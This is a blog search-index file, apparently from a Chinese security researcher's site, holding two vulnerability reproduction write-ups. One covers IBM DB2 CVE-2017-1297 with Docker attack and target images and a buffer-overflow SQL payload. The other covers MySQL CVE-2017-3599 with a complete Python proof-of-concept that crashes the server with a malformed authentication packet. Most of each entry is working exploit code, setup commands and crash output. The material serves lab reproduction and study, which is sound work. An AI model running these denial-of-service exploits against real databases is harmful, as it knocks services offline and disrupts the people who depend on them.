<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2017-1297漏洞复现</title>
    <url>/2024/01/14/CVE-2017-1297%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.exploit-db.com/exploits/42260">IBM DB2 9.7&#x2F;10.1&#x2F;10.5&#x2F;11.1 - Command Line Processor Buffer Overflow - Multiple dos Exploit</a></p>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><blockquote>
<p>IBM DB2 for Linux, UNIX and Windows 9.2, 10.1, 10.5, and 11.1 (includes DB2 Connect Server) is vulnerable to a stack-based buffer overflow, caused by improper bounds checking which could allow a local attacker to execute arbitrary code.</p>
</blockquote>
<h2 id="攻击镜像构建"><a href="#攻击镜像构建" class="headerlink" title="攻击镜像构建"></a>攻击镜像构建</h2><ul>
<li><p><code>exp.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] 正在准备连接目标db2数据库&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$2</span></span><br><span class="line">db2 catalog tcpip4 node remotedb remote <span class="variable">$1</span> server <span class="variable">$2</span></span><br><span class="line">db2 catalog database testdb3 as testdb33 at node remotedb</span><br><span class="line">db2 connect to testdb33 user db2inst1 using 123456</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] 已连接成功目标数据库&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] 正在查询目标数据库数据&quot;</span></span><br><span class="line"><span class="comment"># 查询数据</span></span><br><span class="line">db2 -f select.sql</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] 正在发送PoC&quot;</span></span><br><span class="line"><span class="comment"># 发送 PoC</span></span><br><span class="line">db2 -f crash.sql</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] PoC发送成功&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] 再次尝试查询数据库&quot;</span></span><br><span class="line">db2 -f select.sql</span><br></pre></td></tr></table></figure></li>
<li><p><code>select.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tbl4</span><br></pre></td></tr></table></figure></li>
<li><p><code>crash.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CALL</span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;</span><br></pre></td></tr></table></figure></li>
<li><p><code>entrypoint.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class="built_in">echo</span> <span class="string">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class="built_in">echo</span> pass</span><br><span class="line"><span class="built_in">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class="line">./db2icrt -u db2inst1 db2inst1 </span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2stop&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;finish&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Remote IP: <span class="variable">$REMOTE_IP</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Remote PORT: <span class="variable">$REMOTE_PORT</span>&quot;</span></span><br><span class="line"><span class="comment"># STR=$(echo $3 | cut -d &quot;[&quot; -f 2 |cut -d  &quot;]&quot; -f 1 | cut -d &quot;&#x27;&quot; -f 2)</span></span><br><span class="line"><span class="comment"># echo $STR</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;cd / &amp;&amp; bash /exp.sh <span class="variable">$REMOTE_IP</span> <span class="variable">$REMOTE_PORT</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure></li>
<li><p><code>Dockerfile</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM centos:7.2.1511</span><br><span class="line"></span><br><span class="line">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class="line"><span class="comment"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN <span class="built_in">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN chmod 644 /etc/sysctl.conf</span></span><br><span class="line"><span class="comment"># RUN sysctl -p </span></span><br><span class="line">RUN ipcs -l</span><br><span class="line"></span><br><span class="line">RUN groupadd -g 901 db2iadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 902 db2fadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 903 dasadm1  &amp;&amp; \</span><br><span class="line">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \ </span><br><span class="line">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \</span><br><span class="line">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN cd server &amp;&amp; ./db2prereqcheck &amp;&amp;  echo &#x27;ESE&#x27; | ./db2_install -b /opt/ibm/db2/V9.7 || echo pass</span></span><br><span class="line"><span class="comment"># RUN cd /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  &amp;&amp;\</span></span><br><span class="line"><span class="comment">#     ./db2icrt -u db2inst1 db2inst1 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RUN db2 create database KHYX_YS using codeset GBK territory CN</span></span><br><span class="line"><span class="comment"># RUN db2 create database KHYX_YS </span></span><br><span class="line"><span class="comment"># RUN db2set –all</span></span><br><span class="line">COPY entrypoint.sh /entrypoint.sh</span><br><span class="line">COPY exp.sh /exp.sh</span><br><span class="line">COPY select.sql /select.sql</span><br><span class="line">COPY crash.sql /crash.sql</span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">chmod</span> +x /entrypoint.sh</span><br><span class="line">RUN <span class="built_in">chmod</span> +x /exp.sh</span><br><span class="line"></span><br><span class="line">ENV REMOTE_IP=<span class="variable">$&#123;REMOTE_IP&#125;</span></span><br><span class="line">ENV REMOTE_PORT=<span class="variable">$&#123;REMOTE_PORT&#125;</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/entrypoint.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EXPOSE 60000</span><br></pre></td></tr></table></figure>
</li>
<li><p>镜像构建（获得docker_image_id_1）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build .</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="被测环境搭建"><a href="#被测环境搭建" class="headerlink" title="被测环境搭建"></a>被测环境搭建</h2><ul>
<li><p><code>create_table.sql</code>:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE testdb3</span><br><span class="line"><span class="keyword">connect</span> <span class="keyword">to</span> testdb3</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tbl4 (stu_name <span class="type">CHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY)</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tbl4 <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> stu_age <span class="type">CHAR</span>(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>,<span class="string">&#x27;20&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;bob&#x27;</span>,<span class="string">&#x27;16&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;tom&#x27;</span>,<span class="string">&#x27;19&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;john&#x27;</span>,<span class="string">&#x27;32&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;amy&#x27;</span>,<span class="string">&#x27;13&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;france&#x27;</span>,<span class="string">&#x27;56&#x27;</span>)</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tbl4 <span class="keyword">VALUES</span> (<span class="string">&#x27;frank&#x27;</span>,<span class="string">&#x27;41&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl4</span><br></pre></td></tr></table></figure></li>
<li><p><code>entrypoint.sh</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> server &amp;&amp; ./db2prereqcheck &amp;&amp;  <span class="built_in">echo</span> <span class="string">&#x27;ESE&#x27;</span> | ./db2_install -b /opt/ibm/db2/V9.7 || <span class="built_in">echo</span> pass</span><br><span class="line"><span class="built_in">cd</span> /opt/ibm/db2/V9.7/instance &amp;&amp; ./dascrt -u dasusr1  </span><br><span class="line">./db2icrt -u db2inst1 db2inst1 </span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2set DB2COMM=TCPIP&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2 update dbm cfg using SVCENAME 60000&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2stop&quot;</span></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;db2start&quot;</span></span><br><span class="line"></span><br><span class="line">su - db2inst1 -c <span class="string">&quot;cd / &amp;&amp; db2 -f create_table.sql&quot;</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>Dockerfile</code>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">FROM centos:7.2.1511</span><br><span class="line"></span><br><span class="line">COPY v9.7_linuxx64_server.tar.gz v9.7_linuxx64_server.tar.gz</span><br><span class="line"><span class="comment"># COPY sysctl.conf /etc/sysctl.conf</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RUN tar -xzvf v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN <span class="built_in">rm</span> v9.7_linuxx64_server.tar.gz</span><br><span class="line">RUN yum install -y libstdc++ libstdc++.so.6 libaio</span><br><span class="line"></span><br><span class="line">RUN ipcs -l</span><br><span class="line"></span><br><span class="line">RUN groupadd -g 901 db2iadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 902 db2fadm1 &amp;&amp; \</span><br><span class="line">    groupadd -g 903 dasadm1  &amp;&amp; \</span><br><span class="line">    useradd -g db2iadm1 -u 801 -d /home/db2inst1 -m  db2inst1 &amp;&amp; \ </span><br><span class="line">    useradd -g db2fadm1 -u 802 -d /home/db2fenc1 -m db2fenc1 &amp;&amp; \</span><br><span class="line">    useradd -g dasadm1 -u 803 -d /home/dasadm1 -m dasusr1 &amp;&amp;\</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;db2inst1:123456&#x27;</span> | chpasswd</span><br><span class="line"></span><br><span class="line">COPY entrypoint.sh /entrypoint.sh</span><br><span class="line"><span class="comment"># COPY exp.sh /exp.sh</span></span><br><span class="line">COPY create_table.sql /create_table.sql</span><br><span class="line"><span class="comment"># COPY crash.sql /crash.sql</span></span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">chmod</span> +x /entrypoint.sh</span><br><span class="line"><span class="comment"># RUN chmod +x /exp.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ENV REMOTE_IP=$&#123;REMOTE_IP&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;/entrypoint.sh&quot;</span>]</span><br><span class="line"></span><br><span class="line">EXPOSE 60000</span><br><span class="line"><span class="comment"># CMD [&#x27;REMOTE_IP&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CMD [&quot;tail&quot;,&#x27;-f&#x27;,&#x27;/dev/null&#x27;]</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>镜像构建（获得docker_image_id_2）</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker build.</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="被测环境容器启动（比较慢）"><a href="#被测环境容器启动（比较慢）" class="headerlink" title="被测环境容器启动（比较慢）"></a>被测环境容器启动（比较慢）</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker run -it -d --privileged -p 60000:60000  docker_image_id_2</span><br></pre></td></tr></table></figure>

<h2 id="攻击脚本执行"><a href="#攻击脚本执行" class="headerlink" title="攻击脚本执行"></a>攻击脚本执行</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># REMOTE_IP为被测环境的ip</span></span><br><span class="line"><span class="comment"># REMOTE_PORT为被测环境的端口</span></span><br><span class="line"><span class="comment"># docker_image_id_1 为攻击镜像id</span></span><br><span class="line"></span><br><span class="line">docker run --network host -it -d --privileged -e REMOTE_IP=<span class="string">&#x27;192.168.33.44&#x27;</span> -e REMOTE_PORT=<span class="string">&#x27;60000&#x27;</span> docker_image_id_1</span><br></pre></td></tr></table></figure>


<h2 id="攻击成功效果"><a href="#攻击成功效果" class="headerlink" title="攻击成功效果"></a>攻击成功效果</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">……（此处省略n行）……</span><br><span class="line"></span><br><span class="line">[+] 已连接成功目标数据库</span><br><span class="line">[+] 正在查询目标数据库数据</span><br><span class="line"></span><br><span class="line">STU_NAME   STU_AGE   </span><br><span class="line">---------- ----------</span><br><span class="line">alice      20        </span><br><span class="line">bob        16        </span><br><span class="line">tom        19        </span><br><span class="line">john       32        </span><br><span class="line">amy        13        </span><br><span class="line">france     56        </span><br><span class="line">frank      41        </span><br><span class="line"></span><br><span class="line">7 record(s) selected.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] 正在发送PoC</span><br><span class="line">[+] PoC发送成功</span><br><span class="line">[+] 再次尝试查询数据库</span><br><span class="line">SQL1024N  A database connection does not exist.  SQLSTATE=08003</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>CVE-2017-1297</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2017-3599漏洞复现</title>
    <url>/2024/01/14/CVE-2017-3599%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.exploit-db.com/exploits/41954">MySQL &lt; 5.6.35 &#x2F; &lt; 5.7.17 - Integer Overflow - Multiple dos Exploit</a></p>
<h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><blockquote>
<p>Vulnerability in the MySQL Server component of Oracle MySQL (subcomponent: Server: Pluggable Auth). Supported versions that are affected are 5.6.35 and earlier and 5.7.17 and earlier. Easily “exploitable” vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise MySQL Server. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server. CVSS 3.0 Base Score 7.5 (Availability impacts). CVSS Vector: (CVSS:3.0&#x2F;AV:N&#x2F;AC:L&#x2F;PR:N&#x2F;UI:N&#x2F;S:U&#x2F;C:N&#x2F;I:N&#x2F;A:H). NOTE: the previous information is from the April 2017 CPU. Oracle has not commented on third-party claims that this issue is an integer overflow in sql&#x2F;auth&#x2F;sql_authentication.cc which allows remote attackers to cause a denial of service via a crafted authentication packet.</p>
</blockquote>
<h2 id="被测环境"><a href="#被测环境" class="headerlink" title="被测环境"></a>被测环境</h2><ul>
<li>docker镜像：<code>mysql:5.6.35</code></li>
<li>启动被测环境容器：<code>docker run -d -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 pmysql:5.6.35</code></li>
</ul>
<h2 id="POC脚本"><a href="#POC脚本" class="headerlink" title="POC脚本"></a>POC脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># Source: https://raw.githubusercontent.com/SECFORCE/CVE-2017-3599/master/cve-2017-3599_poc.py</span></span><br><span class="line"><span class="string"># Exploit Title: Remote MySQL DOS (Integer Overflow)</span></span><br><span class="line"><span class="string"># Google Dork: N/A</span></span><br><span class="line"><span class="string"># Date: 13th April 2017</span></span><br><span class="line"><span class="string"># Exploit Author: Rodrigo Marcos</span></span><br><span class="line"><span class="string"># Vendor Homepage: https://www.mysql.com/</span></span><br><span class="line"><span class="string"># Software Link: https://www.mysql.com/downloads/</span></span><br><span class="line"><span class="string"># Version: 5.6.35 and below / 5.7.17 and below</span></span><br><span class="line"><span class="string"># Tested on: N/A</span></span><br><span class="line"><span class="string"># CVE : CVE-2017-3599</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket </span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CVE-2017-3599 Proof of Concept exploit code.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://www.secforce.com/blog/2017/04/cve-2017-3599-pre-auth-mysql-remote-dos/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Rodrigo Marcos</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&lt;<span class="number">2</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;Usage: python &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; host [port]&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    HOST = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">2</span>:</span><br><span class="line">        PORT = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="comment"># Yes, no error checking... living on the wild side!</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        PORT = <span class="number">3306</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Creating packet...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">3 bytes		Packet lenth</span></span><br><span class="line"><span class="string">1 bytes 	Packet number</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Login request:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Packet format (when the server is 4.1 or newer):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Bytes       Content</span></span><br><span class="line"><span class="string">-----       ----</span></span><br><span class="line"><span class="string">4           client capabilities</span></span><br><span class="line"><span class="string">4           max packet size</span></span><br><span class="line"><span class="string">1           charset number</span></span><br><span class="line"><span class="string">23          reserved (always 0)</span></span><br><span class="line"><span class="string">n           user name, \0-terminated</span></span><br><span class="line"><span class="string">n           plugin auth data (e.g. scramble), length encoded</span></span><br><span class="line"><span class="string">n           database name, \0-terminated</span></span><br><span class="line"><span class="string">            (if CLIENT_CONNECT_WITH_DB is set in the capabilities)</span></span><br><span class="line"><span class="string">n           client auth plugin name - \0-terminated string,</span></span><br><span class="line"><span class="string">            (if CLIENT_PLUGIN_AUTH is set in the capabilities)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># packet_len = &#x27;\x64\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">packet_num = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Login request packet</span></span><br><span class="line">packet_cap = <span class="string">&#x27;\x85\xa2\xbf\x01&#x27;</span>		<span class="comment"># client capabilities (default)</span></span><br><span class="line">packet_max = <span class="string">&#x27;\x00\x00\x00\x01&#x27;</span>		<span class="comment"># max packet size (default)</span></span><br><span class="line">packet_cset = <span class="string">&#x27;\x21&#x27;</span>				<span class="comment"># charset (default)</span></span><br><span class="line">p_reserved = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">23</span> 			<span class="comment"># 23 bytes reserved with nulls (default)</span></span><br><span class="line">packet_usr =  <span class="string">&#x27;test\x00&#x27;</span> 			<span class="comment"># username null terminated (default)</span></span><br><span class="line"></span><br><span class="line">packet_auth  = <span class="string">&#x27;\xff&#x27;</span>			<span class="comment"># both \xff and \xfe crash the server</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Conditions to crash:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1 - packet_auth must start with \xff or \xfe</span></span><br><span class="line"><span class="string">2 - packet_auth must be shorter than 8 chars</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The expected value is the password, which could be of two different formats</span></span><br><span class="line"><span class="string">(null terminated or length encoded) depending on the client functionality.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">packet = packet_cap + packet_max + packet_cset + p_reserved + packet_usr + packet_auth </span><br><span class="line">packet_len = pack(<span class="string">&#x27;i&#x27;</span>,<span class="built_in">len</span>(packet))[:<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">request = packet_len + packet_num + packet</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Connecting to host...&quot;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((HOST, PORT))</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Connected.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Unable to connect to host &quot;</span> + HOST + <span class="string">&quot; on port &quot;</span> + <span class="built_in">str</span>(PORT) + <span class="string">&quot;.&quot;</span>	</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;[+] Exiting.&quot;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Receiving greeting from remote host...&quot;</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Sending our payload...&quot;</span></span><br><span class="line">s.send(request)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Done.&quot;</span></span><br><span class="line"><span class="comment">#print &quot;Our data: %r&quot; % request</span></span><br><span class="line"></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

